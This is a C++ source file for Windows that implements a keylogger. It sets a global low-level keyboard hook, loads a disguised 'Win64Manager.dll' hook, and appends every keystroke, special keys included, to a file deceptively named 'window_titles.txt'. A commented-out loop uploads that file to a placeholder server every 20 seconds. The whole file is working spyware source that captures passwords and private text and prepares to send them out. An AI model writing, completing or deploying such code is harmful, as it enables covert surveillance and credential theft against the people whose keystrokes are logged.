#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <psapi.h>
#include "SendFile.h"

typedef void (*InstallHookWnd)(HINSTANCE);
typedef void (*UninstallHookWnd)();


LRESULT CALLBACK llKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, llKeyboardProc, NULL, NULL);


int main() {
	HMODULE hdll = LoadLibrary(L"Win64Manager.dll");

	InstallHookWnd hookInstall = (InstallHookWnd)GetProcAddress(hdll, "InstallHook");
	UninstallHookWnd uninstallhook = (UninstallHookWnd)GetProcAddress(hdll, "UninstallHook");

	hookInstall(hdll);
	std::string wbh = "A link to the server where the file should be uploaded";
	std::string filePath = "./window_titles.txt";


	/*while (true)
	{
		SendNumbers(wbh, filePath);

		Sleep(20000);
	}*/

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

}




LRESULT CALLBACK llKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
	HKL kbdLayout = GetKeyboardLayout(0);

	BYTE keysState[256];
	GetKeyboardState(keysState);

	WCHAR buffer[5];

	int res = ToUnicodeEx(key->vkCode, key->scanCode, keysState, buffer, sizeof(buffer) / sizeof(WCHAR), 0, kbdLayout);
	std::ofstream theFile;
	theFile.open("./window_titles.txt", std::ios::app);

	if (wParam == WM_KEYDOWN) {

		switch (key->vkCode)
		{
		case VK_BACK: theFile << "[ BACK ]"; break;
		case VK_TAB: theFile << "[ TAB ]"; break;
		case VK_ESCAPE: theFile << "[ ESCAPE ]"; break;
		case VK_SPACE: theFile << "[ SPACE ]"; break;
		case VK_LEFT: theFile << "[ LEFT ]"; break;
		case VK_RIGHT: theFile << "[ RIGHT ]"; break;
		case VK_UP: theFile << "[ UP ]"; break;
		case VK_SHIFT: theFile << "[ SHIFT ]"; break;
		case VK_DOWN:theFile << "[ DOWN ]"; break;
		case VK_DELETE: theFile << "[ DELETE ]"; break;
		case VK_CAPITAL: theFile << "[ CAPS ]"; break;

		}
		if (res > 0) {
			theFile << static_cast<char>(buffer[0]);

		}
	}

	theFile.close();
	return CallNextHookEx(kbhook, nCode, wParam, lParam);
}

